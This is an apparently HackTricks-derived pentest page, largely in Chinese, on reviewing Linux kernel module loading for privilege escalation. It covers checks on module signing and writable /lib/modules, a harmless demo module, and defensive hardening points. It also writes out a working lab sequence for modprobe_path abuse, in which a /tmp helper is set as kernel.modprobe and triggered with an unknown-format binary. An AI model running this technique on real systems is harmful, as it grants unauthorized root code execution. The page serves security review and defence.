# Kernel Modules and modprobe Abuse

{{#include ../../banners/hacktricks-training.md}}

## 内核模块和模块加载配置错误

在 Linux privilege escalation review 期间，内核模块支持是一个高影响领域。不要仅凭每条 unsigned-module 消息就认为存在可利用性，而应使用它来回答以下实际问题：

- 当前用户是否可以通过 `sudo`、capabilities 或可写的 helper path 加载模块？
- 模块加载是否仍处于启用状态？
- 模块签名强制是否已禁用？
- 模块目录或模块文件是否可写？
- 是否可以读取 kernel logs 来确认发生了什么？

快速初步检查：
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
解释：

- `modules_disabled=1` 表示在重启前无法加载新模块。
- `module_sig_enforce=1` 通常会阻止未签名模块。
- `dmesg_restrict=0` 允许非特权用户在许多系统上读取 kernel logs。
- `/lib/modules/$(uname -r)/` 下的可写路径很危险，因为模块发现和自动加载可能会信任该目录树。

### 加载模块并读取 kernel 输出

如果你有合法权限加载本地模块，`insmod` 会插入你提供的确切 `.ko` 文件。模块的 init 函数会立即运行，通过 `printk()` 写入的消息会出现在 kernel logs 中。

用于 review 或 lab 环境的最小工作流程：
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
如果 `sudo -l` 允许执行 `insmod`、`modprobe` 或其 wrapper，请将其视为 critical：
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo-allowed `insmod`

允许用户运行 `insmod` 的 sudo 规则，不能与允许运行普通管理辅助程序相提并论。`.ko` 被插入后，模块的初始化代码会立即在 kernel context 中运行，因此实际的审查问题是：“该用户能否选择或修改要加载的模块？”

通用审查流程：
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
如果用户能够提供任意 `.ko`，那么在经授权的评估中，应将该规则视为完整系统 compromise。更安全的操作模式是避免通过 sudo 委托模块加载；如果无法避免，则应限制确切路径、所有权、权限、签名策略以及移除流程。

对于在受控实验室中构建 harmless module 的模式，最小源代码和 Makefile 如下：
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
仅在获得授权的实验室中构建和加载：
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path` abuse 检查

`kernel.modprobe` 控制内核在需要模块加载 assistance 时调用的 userspace helper。如果攻击者能将其修改为一个可写的可执行路径，并触发未知 binary format 或其他模块请求路径，就可能实现 root code execution。

检查当前 helper：
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
检查是否可以影响它：
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
通用的、仅限实验室使用的模式：
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
在经过加固的系统上，这应该失败，因为非特权用户无法写入 `kernel.modprobe`，辅助程序路径不可写，或模块加载路径受到阻止。

### 可写 `/lib/modules` 审查

可写的模块目录可能导致模块替换、恶意模块植入，或根据之后调用 `modprobe` 的方式造成自动加载滥用。

审查可写位置：
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
如果发现可写的 module 内容，请检查 module 是如何被发现的：
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
防御要点：

- 确保 `/lib/modules` 的所有者为 `root:root`，且用户不可写入。
- 在操作上可行的情况下，在启动后设置 `kernel.modules_disabled=1`。
- 在需要可加载 modules 的系统上强制执行 module signing。
- 监控对 `/proc/sys/kernel/modprobe`、`/lib/modules` 的写入，以及意外执行的 `insmod`/`modprobe`。

{{#include ../../banners/hacktricks-training.md}}
